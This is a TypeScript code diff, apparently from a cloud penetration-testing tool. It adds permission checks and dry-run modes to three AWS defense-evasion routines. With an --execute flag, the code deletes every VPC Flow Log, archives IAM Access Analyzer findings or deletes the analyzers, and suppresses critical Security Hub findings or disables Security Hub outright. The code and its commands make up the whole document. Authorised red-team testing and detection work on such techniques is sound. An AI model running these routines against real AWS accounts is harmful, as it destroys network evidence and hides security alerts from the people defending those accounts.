-      "--query",
-      "FlowLogs[].[FlowLogId,ResourceId,LogDestinationType,LogDestination,FlowLogStatus,TrafficType]",
-    ],
-    profile,
-    region,
-    timeout,
-  )
-  if (flowLogs.exitCode !== 0) return { output: `[-] Cannot describe flow logs: ${flowLogs.stderr.trim()}`, findings }
+  const id = await aws(["sts", "get-caller-identity"], profile, region, timeout)
+  if (id.exitCode !== 0) return { output: `[-] No valid credentials: ${id.stderr.trim()}`, findings }
+  const callerArn = (tryJson(id.stdout)?.Arn || "") as string
+  output.push(`[+] Identity: ${callerArn}`)
+
+  const simActions = ["ec2:DescribeFlowLogs", "ec2:DeleteFlowLogs"]
+  const sim = await aws(["iam", "simulate-principal-policy", "--policy-source-arn", callerArn, "--action-names", ...simActions], profile, region, timeout)
+  const results = tryJson(sim.stdout)?.EvaluationResults || []
+  const allowed = new Set((results as Record<string, string>[]).filter(r => r.EvalDecision === "allowed").map(r => r.EvalActionName))
+
+  output.push(`\n[*] Pre-flight permission check:`)
+  for (const a of simActions) output.push(`  ${allowed.has(a) ? "[+] ALLOWED" : "[-] DENIED"}: ${a}`)
+
+  output.push(`\n[*] CloudTrail events: DeleteFlowLogs`)
+  output.push(`[*] GuardDuty impact: GuardDuty uses VPC Flow Logs for network-based findings (PortProbe, DDoS, UnauthorizedAccess)`)
+
+  const flowLogs = await aws(["ec2", "describe-flow-logs", "--query", "FlowLogs[].[FlowLogId,ResourceId,LogDestinationType,LogDestination,FlowLogStatus,TrafficType,MaxAggregationInterval,Tags]"], profile, region, timeout)
+  if (flowLogs.exitCode !== 0) return { output: output.join("\n") + `\n[-] Cannot describe flow logs: ${flowLogs.stderr.trim()}`, findings }
 
   const fl = tryJson(flowLogs.stdout) || []
-  output.push(`[+] VPC Flow Logs: ${fl.length}`)
-  for (const f of fl) output.push(`    ${f[0]} — ${f[1]} → ${f[2]}:${f[3]} — ${f[4]} (${f[5]})`)
+  output.push(`\n[+] VPC Flow Logs: ${fl.length}`)
+
+  const destTypes: Record<string, number> = {}
+  for (const f of fl as unknown[][]) {
+    output.push(`\n  ${f[0]} — ${f[1]} → ${f[2]}:${f[3]}`)
+    output.push(`    Status: ${f[4]} Traffic: ${f[5]} Interval: ${f[6]}s`)
+    const dtype = (f[2] || "unknown") as string
+    destTypes[dtype] = (destTypes[dtype] || 0) + 1
+  }
+
+  output.push(`\n[+] Destination summary: ${Object.entries(destTypes).map(([k, v]) => `${k}=${v}`).join(", ")}`)
+  if (destTypes["cloud-watch-logs"]) output.push(`  [!] ${destTypes["cloud-watch-logs"]} flow log(s) go to CloudWatch — also check cloudwatch_tamper`)
+  if (destTypes["s3"]) output.push(`  [!] ${destTypes["s3"]} flow log(s) go to S3 — historical data persists even after deletion`)
 
   if (action === "delete") {
-    for (const f of fl) {
-      const r = await aws(["ec2", "delete-flow-logs", "--flow-log-ids", f[0]], profile, region, timeout)
-      if (r.exitCode === 0) {
-        output.push(`    [+] Deleted: ${f[0]}`)
-        findings.push({
-          checkId: "AWS-EVASION-005",
-          provider: "aws",
-          severity: "critical",
-          status: "DELETED",
-          resource: `vpc:flowlog:${f[0]}`,
-          title: `VPC Flow Log deleted: ${f[0]}`,
-          details: `Flow log for ${f[1]} deleted — network traffic no longer logged`,
-          remediation: "Recreate flow log for VPC/subnet/ENI",
-        })
-      } else {
-        output.push(`    [-] Delete failed for ${f[0]}: ${r.stderr.trim()}`)
+    if (!allowed.has("ec2:DeleteFlowLogs")) {
+      output.push(`\n[-] ec2:DeleteFlowLogs DENIED — vector blocked`)
+      findings.push({ checkId: "AWS-EVASION-VPC-001", provider: "aws", severity: "info", status: "BLOCKED", resource: `iam://${callerArn}`, title: "VPC flow log deletion blocked", details: "Cannot delete flow logs", remediation: "N/A" })
+      return { output: output.join("\n"), findings }
+    }
+    for (const f of fl as unknown[][]) {
+      if (!execute) {
+        output.push(`  [+] DRY RUN — would delete: ${f[0]} (${f[1]})`)
+        continue
       }
+      const r = await aws(["ec2", "delete-flow-logs", "--flow-log-ids", f[0] as string], profile, region, timeout)
+      if (r.exitCode === 0) {
+        output.push(`  [+] Deleted: ${f[0]}`)
+        findings.push({ checkId: "AWS-EVASION-005", provider: "aws", severity: "critical", status: "DELETED", resource: `vpc:flowlog:${f[0]}`, title: `VPC Flow Log deleted: ${f[0]}`, details: `Flow log for ${f[1]} deleted — network traffic no longer logged. CloudTrail event: DeleteFlowLogs`, remediation: "Recreate flow log for VPC/subnet/ENI" })
+      } else {
+        output.push(`  [-] Delete failed for ${f[0]}: ${r.stderr.trim()}`)
+      }
+    }
+    if (!execute) {
+      findings.push({ checkId: "AWS-EVASION-005", provider: "aws", severity: "critical", status: "READY", resource: `vpc:flowlogs:${fl.length}`, title: `VPC flow log deletion viable: ${fl.length} flow logs`, details: "DeleteFlowLogs permission confirmed — all network evidence can be destroyed", remediation: "Restrict ec2:DeleteFlowLogs via SCP, use org-level flow log enforcement" })
     }
   }
 
-  if (action === "status") output.push("\n[*] Use --action delete to remove all flow logs")
+  if (action === "status") {
+    output.push(`\n[*] Viable: ${allowed.has("ec2:DeleteFlowLogs") ? "delete" : "NONE — deletion blocked"}`)
+    output.push(`[*] Use --action delete [--execute]`)
+  }
 
   return { output: output.join("\n"), findings }
 }
@@ -338,82 +461,96 @@ export async function accessAnalyzerSuppress(args: string[], timeout: number): P
   const action = argVal(args, "--action") || "status"
   const profile = argVal(args, "--profile")
   const region = argVal(args, "--region")
-  const output: string[] = ["[*] IAM Access Analyzer\n"]
+  const execute = hasFlag(args, "--execute")
+  const output: string[] = ["[*] IAM Access Analyzer — External Access Evasion\n"]
   const findings: Finding[] = []
 
-  const analyzers = await aws(
-    ["accessanalyzer", "list-analyzers", "--query", "analyzers[].[arn,name,type,status]"],
-    profile,
-    region,
-    timeout,
-  )
-  if (analyzers.exitCode !== 0) return { output: `[-] Cannot list analyzers: ${analyzers.stderr.trim()}`, findings }
+  const id = await aws(["sts", "get-caller-identity"], profile, region, timeout)
+  if (id.exitCode !== 0) return { output: `[-] No valid credentials: ${id.stderr.trim()}`, findings }
+  const callerArn = (tryJson(id.stdout)?.Arn || "") as string
+  output.push(`[+] Identity: ${callerArn}`)
+
+  const simActions = ["access-analyzer:ListAnalyzers", "access-analyzer:ListFindings", "access-analyzer:UpdateFindings", "access-analyzer:DeleteAnalyzer"]
+  const sim = await aws(["iam", "simulate-principal-policy", "--policy-source-arn", callerArn, "--action-names", ...simActions], profile, region, timeout)
+  const results = tryJson(sim.stdout)?.EvaluationResults || []
+  const allowed = new Set((results as Record<string, string>[]).filter(r => r.EvalDecision === "allowed").map(r => r.EvalActionName))
+
+  output.push(`\n[*] Pre-flight permission check:`)
+  for (const a of simActions) output.push(`  ${allowed.has(a) ? "[+] ALLOWED" : "[-] DENIED"}: ${a}`)
+
+  output.push(`\n[*] CloudTrail events: UpdateFindings, DeleteAnalyzer`)
+  output.push(`[*] Detection: Security Hub finding for deleted analyzer, Config rule noncompliance`)
+
+  const analyzers = await aws(["accessanalyzer", "list-analyzers", "--query", "analyzers[].[arn,name,type,status]"], profile, region, timeout)
+  if (analyzers.exitCode !== 0) return { output: output.join("\n") + `\n[-] Cannot list analyzers: ${analyzers.stderr.trim()}`, findings }
 
   const al = tryJson(analyzers.stdout) || []
-  output.push(`[+] Access Analyzers: ${al.length}`)
-  for (const a of al) output.push(`    ${a[1]} (${a[2]}) — ${a[3]}`)
+  output.push(`\n[+] Access Analyzers: ${al.length}`)
+  for (const a of al as string[][]) {
+    output.push(`\n  ${a[1]} (${a[2]}) — ${a[3]}`)
+    const isOrg = a[2] === "ORGANIZATION"
+    if (isOrg) output.push(`    [!] Organization-level analyzer — covers all member accounts`)
 
-  for (const a of al) {
-    const aaFindings = await aws(
-      [
-        "accessanalyzer",
-        "list-findings",
-        "--analyzer-arn",
-        a[0],
-        "--query",
-        "findings[].[id,resourceType,resource,status]",
-      ],
-      profile,
-      region,
-      timeout,
-    )
+    const aaFindings = await aws(["accessanalyzer", "list-findings", "--analyzer-arn", a[0], "--query", "findings[].[id,resourceType,resource,status]"], profile, region, timeout)
     if (aaFindings.exitCode === 0) {
       const fl = tryJson(aaFindings.stdout) || []
-      const active = fl.filter((f: string[]) => f[3] === "ACTIVE")
-      output.push(`    Findings: ${fl.length} total, ${active.length} active`)
+      const active = (fl as string[][]).filter(f => f[3] === "ACTIVE")
+      const resolved = (fl as string[][]).filter(f => f[3] === "RESOLVED")
+      const archived = (fl as string[][]).filter(f => f[3] === "ARCHIVED")
+      output.push(`    Findings: ${fl.length} total — ${active.length} active, ${resolved.length} resolved, ${archived.length} archived`)
+
+      const byType: Record<string, number> = {}
+      for (const f of active) { byType[f[1]] = (byType[f[1]] || 0) + 1 }
+      if (Object.keys(byType).length > 0) {
+        output.push(`    Active by type: ${Object.entries(byType).map(([k, v]) => `${k}=${v}`).join(", ")}`)
+      }
 
       if (action === "archive" && active.length > 0) {
-        for (const f of active.slice(0, 50)) {
-          const archive = await aws(
-            ["accessanalyzer", "update-findings", "--analyzer-arn", a[0], "--ids", f[0], "--status", "ARCHIVED"],
-            profile,
-            region,
-            timeout,
-          )
-          if (archive.exitCode === 0) output.push(`    [+] Archived: ${f[0]}`)
+        if (!allowed.has("access-analyzer:UpdateFindings")) {
+          output.push(`    [-] access-analyzer:UpdateFindings DENIED — archive blocked`)
+          findings.push({ checkId: "AWS-EVASION-AA-001", provider: "aws", severity: "info", status: "BLOCKED", resource: `accessanalyzer:${a[1]}`, title: "Access Analyzer finding archive blocked", details: "Cannot update finding status", remediation: "N/A" })
+          continue
         }
-        findings.push({
-          checkId: "AWS-EVASION-006",
-          provider: "aws",
-          severity: "high",
-          status: "SUPPRESSED",
-          resource: `accessanalyzer:${a[1]}`,
-          title: `Access Analyzer findings archived: ${Math.min(active.length, 50)}`,
-          details: "Active findings archived to hide excessive access",
-          remediation: "Unarchive findings and investigate external access",
-        })
+        if (!execute) {
+          output.push(`    [+] DRY RUN — would archive ${Math.min(active.length, 50)} active finding(s)`)
+          findings.push({ checkId: "AWS-EVASION-006", provider: "aws", severity: "high", status: "READY", resource: `accessanalyzer:${a[1]}`, title: `Access Analyzer archive viable: ${active.length} findings`, details: "UpdateFindings permission confirmed — external access findings can be hidden", remediation: "Restrict access-analyzer:UpdateFindings" })
+          continue
+        }
+        let archived2 = 0
+        for (const f of active.slice(0, 50)) {
+          const archive = await aws(["accessanalyzer", "update-findings", "--analyzer-arn", a[0], "--ids", f[0], "--status", "ARCHIVED"], profile, region, timeout)
+          if (archive.exitCode === 0) { archived2++; output.push(`    [+] Archived: ${f[0]} (${f[1]}: ${f[2]})`) }
+        }
+        findings.push({ checkId: "AWS-EVASION-006", provider: "aws", severity: "high", status: "SUPPRESSED", resource: `accessanalyzer:${a[1]}`, title: `Access Analyzer findings archived: ${archived2}`, details: `${archived2} active findings archived to hide excessive external access. CloudTrail event: UpdateFindings`, remediation: "Unarchive findings and investigate external access" })
       }
 
       if (action === "delete") {
+        if (!allowed.has("access-analyzer:DeleteAnalyzer")) {
+          output.push(`    [-] access-analyzer:DeleteAnalyzer DENIED — delete blocked`)
+          findings.push({ checkId: "AWS-EVASION-AA-002", provider: "aws", severity: "info", status: "BLOCKED", resource: `accessanalyzer:${a[1]}`, title: "Access Analyzer deletion blocked", details: "Cannot delete analyzer", remediation: "N/A" })
+          continue
+        }
+        if (!execute) {
+          output.push(`    [+] DRY RUN — would delete analyzer: ${a[1]}`)
+          findings.push({ checkId: "AWS-EVASION-007", provider: "aws", severity: "critical", status: "READY", resource: `accessanalyzer:${a[1]}`, title: `Access Analyzer deletion viable: ${a[1]}`, details: `DeleteAnalyzer permission confirmed — ${isOrg ? "org-wide" : "account-level"} external access detection will stop`, remediation: "Restrict access-analyzer:DeleteAnalyzer via SCP" })
+          continue
+        }
         const del = await aws(["accessanalyzer", "delete-analyzer", "--analyzer-name", a[1]], profile, region, timeout)
         if (del.exitCode === 0) {
           output.push(`    [+] Analyzer deleted: ${a[1]}`)
-          findings.push({
-            checkId: "AWS-EVASION-007",
-            provider: "aws",
-            severity: "critical",
-            status: "DELETED",
-            resource: `accessanalyzer:${a[1]}`,
-            title: `Access Analyzer deleted: ${a[1]}`,
-            details: "Analyzer removed — external access will no longer be detected",
-            remediation: "Recreate analyzer for account/organization",
-          })
+          findings.push({ checkId: "AWS-EVASION-007", provider: "aws", severity: "critical", status: "DELETED", resource: `accessanalyzer:${a[1]}`, title: `Access Analyzer deleted: ${a[1]}`, details: `Analyzer removed — external access will no longer be detected. CloudTrail event: DeleteAnalyzer`, remediation: "Recreate analyzer for account/organization" })
         }
       }
     }
   }
 
-  if (action === "status") output.push("\n[*] Actions: --action archive | delete")
+  if (action === "status") {
+    const viable: string[] = []
+    if (allowed.has("access-analyzer:UpdateFindings")) viable.push("archive")
+    if (allowed.has("access-analyzer:DeleteAnalyzer")) viable.push("delete")
+    output.push(`\n[*] Viable actions: ${viable.length > 0 ? viable.join(", ") : "NONE"}`)
+    output.push(`[*] Use --action archive|delete [--execute]`)
+  }
 
   return { output: output.join("\n"), findings }
 }
@@ -422,90 +559,108 @@ export async function securityHubSuppress(args: string[], timeout: number): Prom
   const action = argVal(args, "--action") || "status"
   const profile = argVal(args, "--profile")
   const region = argVal(args, "--region")
-  const output: string[] = ["[*] Security Hub\n"]
+  const execute = hasFlag(args, "--execute")
+  const output: string[] = ["[*] Security Hub — Finding Suppression\n"]
   const findings: Finding[] = []
 
+  const id = await aws(["sts", "get-caller-identity"], profile, region, timeout)
+  if (id.exitCode !== 0) return { output: `[-] No valid credentials: ${id.stderr.trim()}`, findings }
+  const callerArn = (tryJson(id.stdout)?.Arn || "") as string
+  output.push(`[+] Identity: ${callerArn}`)
+
+  const simActions = ["securityhub:DescribeHub", "securityhub:GetFindings", "securityhub:BatchUpdateFindings", "securityhub:DisableSecurityHub"]
+  const sim = await aws(["iam", "simulate-principal-policy", "--policy-source-arn", callerArn, "--action-names", ...simActions], profile, region, timeout)
+  const results = tryJson(sim.stdout)?.EvaluationResults || []
+  const allowed = new Set((results as Record<string, string>[]).filter(r => r.EvalDecision === "allowed").map(r => r.EvalActionName))
+
+  output.push(`\n[*] Pre-flight permission check:`)
+  for (const a of simActions) output.push(`  ${allowed.has(a) ? "[+] ALLOWED" : "[-] DENIED"}: ${a}`)
+
+  output.push(`\n[*] CloudTrail events: BatchUpdateFindings, DisableSecurityHub`)
+  output.push(`[*] Detection: org admin sees member disable, Config rule noncompliance`)
+
   const hub = await aws(["securityhub", "describe-hub"], profile, region, timeout)
-  if (hub.exitCode !== 0) {
-    return { output: `[-] Security Hub not enabled: ${hub.stderr.trim()}`, findings }
-  }
+  if (hub.exitCode !== 0) return { output: output.join("\n") + `\n[-] Security Hub not enabled: ${hub.stderr.trim()}`, findings }
 
   const hubInfo = tryJson(hub.stdout)
-  output.push(`[+] Security Hub: ${hubInfo?.HubArn}`)
-  output.push(`    Subscribed: ${hubInfo?.SubscribedAt}`)
+  output.push(`\n[+] Security Hub: ${hubInfo?.HubArn}`)
+  output.push(`  Subscribed: ${hubInfo?.SubscribedAt}`)
+  if (hubInfo?.AutoEnableControls !== undefined) output.push(`  Auto-enable controls: ${hubInfo.AutoEnableControls}`)
 
-  const shFindings = await aws(
-    [
-      "securityhub",
-      "get-findings",
-      "--filters",
-      '{"WorkflowStatus":[{"Value":"NEW","Comparison":"EQUALS"}],"SeverityLabel":[{"Value":"CRITICAL","Comparison":"EQUALS"},{"Value":"HIGH","Comparison":"EQUALS"}]}',
-      "--max-items",
-      "50",
-    ],
-    profile,
-    region,
-    timeout,
-  )
+  const admin = await aws(["securityhub", "get-administrator-account"], profile, region, timeout)
+  if (admin.exitCode === 0) {
+    const adm = tryJson(admin.stdout)?.Administrator
+    if (adm?.AccountId) output.push(`  [!] Org admin: ${adm.AccountId} (${adm.MemberStatus}) — disable may be blocked`)
+  }
+
+  const standards = await aws(["securityhub", "get-enabled-standards", "--query", "StandardsSubscriptions[].[StandardsArn,StandardsStatus]"], profile, region, timeout)
+  if (standards.exitCode === 0) {
+    const sl = tryJson(standards.stdout) || []
+    output.push(`  Enabled standards: ${sl.length}`)
+    for (const s of sl as string[][]) output.push(`    ${(s[0] || "").split("/").pop()} — ${s[1]}`)
+  }
+
+  const shFindings = await aws(["securityhub", "get-findings", "--filters", '{"WorkflowStatus":[{"Value":"NEW","Comparison":"EQUALS"}],"SeverityLabel":[{"Value":"CRITICAL","Comparison":"EQUALS"},{"Value":"HIGH","Comparison":"EQUALS"}]}', "--max-items", "50"], profile, region, timeout)
   if (shFindings.exitCode === 0) {
     const fl = tryJson(shFindings.stdout)?.Findings || []
     output.push(`\n[+] Active CRITICAL/HIGH findings: ${fl.length}`)
-    for (const f of fl.slice(0, 20)) {
-      output.push(`    ${f.Title} — ${f.SeverityLabel} — ${f.WorkflowStatus}`)
+
+    const byProduct: Record<string, number> = {}
+    for (const f of fl as Record<string, string>[]) {
+      const product = (f.ProductArn || "").split("/").pop() || "unknown"
+      byProduct[product] = (byProduct[product] || 0) + 1
+    }
+    if (Object.keys(byProduct).length > 0) output.push(`  By source: ${Object.entries(byProduct).map(([k, v]) => `${k}=${v}`).join(", ")}`)
+
+    for (const f of (fl as Record<string, string>[]).slice(0, 15)) {
+      output.push(`  ${f.SeverityLabel} ${f.Title}`)
     }
 
     if (action === "suppress" && fl.length > 0) {
-      const updates = fl.map((f: Record<string, string>) => ({
-        Id: f.Id,
-        ProductArn: f.ProductArn,
-      }))
-      const r = await aws(
-        [
-          "securityhub",
-          "batch-update-findings",
-          "--finding-identifiers",
-          JSON.stringify(updates.slice(0, 50)),
-          "--workflow",
-          '{"Status":"SUPPRESSED"}',
-        ],
-        profile,
-        region,
-        timeout,
-      )
+      if (!allowed.has("securityhub:BatchUpdateFindings")) {
+        output.push(`\n[-] securityhub:BatchUpdateFindings DENIED — suppress blocked`)
+        findings.push({ checkId: "AWS-EVASION-SH-001", provider: "aws", severity: "info", status: "BLOCKED", resource: hubInfo?.HubArn || "securityhub", title: "Security Hub suppression blocked", details: "Cannot batch-update findings", remediation: "N/A" })
+        return { output: output.join("\n"), findings }
+      }
+      const updates = (fl as Record<string, string>[]).slice(0, 50).map(f => ({ Id: f.Id, ProductArn: f.ProductArn }))
+      if (!execute) {
+        output.push(`\n[+] DRY RUN — would suppress ${updates.length} finding(s)`)
+        findings.push({ checkId: "AWS-EVASION-008", provider: "aws", severity: "critical", status: "READY", resource: hubInfo?.HubArn || "securityhub", title: `Security Hub suppression viable: ${updates.length} findings`, details: "BatchUpdateFindings permission confirmed — critical findings can be hidden", remediation: "Restrict securityhub:BatchUpdateFindings via SCP" })
+        return { output: output.join("\n"), findings }
+      }
+      const r = await aws(["securityhub", "batch-update-findings", "--finding-identifiers", JSON.stringify(updates), "--workflow", '{"Status":"SUPPRESSED"}'], profile, region, timeout)
       if (r.exitCode === 0) {
-        output.push(`\n[+] Suppressed ${Math.min(fl.length, 50)} finding(s)`)
-        findings.push({
-          checkId: "AWS-EVASION-008",
-          provider: "aws",
-          severity: "critical",
-          status: "SUPPRESSED",
-          resource: hubInfo?.HubArn || "securityhub",
-          title: `Security Hub findings suppressed: ${Math.min(fl.length, 50)}`,
-          details: "Critical/High findings suppressed to hide security issues",
-          remediation: "Review and resolve suppressed findings",
-        })
+        output.push(`\n[+] Suppressed ${updates.length} finding(s)`)
+        findings.push({ checkId: "AWS-EVASION-008", provider: "aws", severity: "critical", status: "SUPPRESSED", resource: hubInfo?.HubArn || "securityhub", title: `Security Hub findings suppressed: ${updates.length}`, details: "Critical/High findings suppressed — CloudTrail event: BatchUpdateFindings", remediation: "Review and resolve suppressed findings" })
       }
     }
   }
 
   if (action === "disable") {
+    if (!allowed.has("securityhub:DisableSecurityHub")) {
+      output.push(`\n[-] securityhub:DisableSecurityHub DENIED — disable blocked`)
+      findings.push({ checkId: "AWS-EVASION-SH-002", provider: "aws", severity: "info", status: "BLOCKED", resource: hubInfo?.HubArn || "securityhub", title: "Security Hub disable blocked", details: "Cannot disable Security Hub", remediation: "N/A" })
+      return { output: output.join("\n"), findings }
+    }
+    if (!execute) {
+      output.push(`\n[+] DRY RUN — would disable Security Hub entirely`)
+      findings.push({ checkId: "AWS-EVASION-009", provider: "aws", severity: "critical", status: "READY", resource: hubInfo?.HubArn || "securityhub", title: "Security Hub disable viable", details: "DisableSecurityHub permission confirmed — all security findings will stop", remediation: "Restrict securityhub:DisableSecurityHub via SCP" })
+      return { output: output.join("\n"), findings }
+    }
     const r = await aws(["securityhub", "disable-security-hub"], profile, region, timeout)
     if (r.exitCode === 0) {
       output.push(`\n[+] Security Hub DISABLED`)
-      findings.push({
-        checkId: "AWS-EVASION-009",
-        provider: "aws",
-        severity: "critical",
-        status: "DISABLED",
-        resource: hubInfo?.HubArn || "securityhub",
-        title: "Security Hub disabled",
-        details: "Security Hub completely disabled — no security findings will be generated",
-        remediation: "Re-enable Security Hub: aws securityhub enable-security-hub",
-      })
+      findings.push({ checkId: "AWS-EVASION-009", provider: "aws", severity: "critical", status: "DISABLED", resource: hubInfo?.HubArn || "securityhub", title: "Security Hub disabled", details: "Security Hub completely disabled — no security findings generated. CloudTrail event: DisableSecurityHub", remediation: "Re-enable: aws securityhub enable-security-hub" })
     }
   }
 
-  if (action === "status") output.push("\n[*] Actions: --action suppress | disable")
+  if (action === "status") {
+    const viable: string[] = []
+    if (allowed.has("securityhub:BatchUpdateFindings")) viable.push("suppress")
+    if (allowed.has("securityhub:DisableSecurityHub")) viable.push("disable")
+    output.push(`\n[*] Viable actions: ${viable.length > 0 ? viable.join(", ") : "NONE"}`)
+    output.push(`[*] Use --action suppress|disable [--execute]`)
+  }
 
   return { output: output.join("\n"), findings }
 }
